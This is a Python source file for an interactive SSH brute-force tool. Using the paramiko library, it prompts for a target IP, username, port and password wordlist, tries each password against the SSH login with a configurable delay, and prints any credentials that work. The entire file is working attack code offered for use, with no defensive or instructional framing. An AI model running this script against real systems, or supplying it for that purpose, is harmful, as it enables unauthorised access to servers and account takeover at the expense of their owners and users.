import paramiko
import time

def ssh_bruteforce(target_ip, username, wordlist_path, port=22, attempt_delay=1, request_rate=1):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        with open(wordlist_path, 'r') as wordlist:
            for password in wordlist:
                password = password.strip()
                attempt_start = time.time()
                try:
                    ssh.connect(target_ip, port=port, username=username, password=password)
                    print(f"Success: Username: {username} | Password: {password}")
                    ssh.close()
                    return True
                except paramiko.AuthenticationException:
                    print(f"Failed: Username: {username} | Password: {password}")
                except Exception as e:
                    print(f"Error: {e}")
                    break
                
                # Calculate time taken for the request
                elapsed = time.time() - attempt_start
                
                # Delay to meet the request rate and attempt delay
                time_to_sleep = max(attempt_delay - elapsed, 0)
                time.sleep(time_to_sleep / request_rate)
    except FileNotFoundError:
        print("Wordlist file not found.")
    except Exception as e:
        print(f"Error: {e}")
    
    print("Brute force attempt failed.")

def main():
    print("SSH Brute Force Tool")
    target_ip = input("Enter target IP address: ")
    username = input("Enter SSH username: ")
    
    # Prompt for the port number
    port = input("Enter SSH port (default is 22): ")
    port = int(port) if port else 22
    
    wordlist_path = input("Enter path to the wordlist: ")
    
    # Prompt for the delay between attempts
    attempt_delay = input("Enter delay between attempts in seconds (default is 1): ")
    attempt_delay = float(attempt_delay) if attempt_delay else 1
    
    # Prompt for the request rate
    request_rate = input("Enter number of requests per second (default is 1): ")
    request_rate = float(request_rate) if request_rate else 1
    
    ssh_bruteforce(target_ip, username, wordlist_path, port, attempt_delay, request_rate)

if __name__ == "__main__":
    main()
